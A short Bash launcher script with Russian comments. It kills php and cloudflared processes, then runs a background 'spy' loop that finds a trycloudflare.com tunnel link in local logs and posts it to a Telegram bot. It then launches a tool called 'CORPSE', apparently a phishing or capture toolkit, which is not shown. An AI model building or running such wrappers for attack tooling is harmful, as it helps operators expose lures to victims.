#!/bin/bash
# 1. Загружаем настройки
source .tg_config

# 2. Убиваем старые процессы
pkill -f spy.sh
pkill -f cloudflared
pkill -f php

# 3. Запускаем улучшенного шпиона в фоне
(
  OLD_LINK=""
  while true; do
    # Ищем ссылку во всех логах папки
    LINK=$(grep -rEiho 'https://[-0-9a-z.]*\.trycloudflare.com' . 2>/dev/null | head -n 1)
    if [ ! -z "$LINK" ] && [ "$LINK" != "$OLD_LINK" ]; then
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
             -d "chat_id=$CHAT_ID" \
             -d "text=🚀 ССЫЛКА ГОТОВА:%0A%0A$LINK" > /dev/null
        OLD_LINK=$LINK
    fi
    sleep 3
  done
) & 

echo "✅ Бот-шпион активен!"
echo "🚀 Запускаю основное меню через 2 секунды..."
sleep 2

# 4. Запускаем твой основной инструмент (тот самый CORPSE)
bash corpse.sh # Если основной файл называется по-другому, например start.sh - замени имя тут
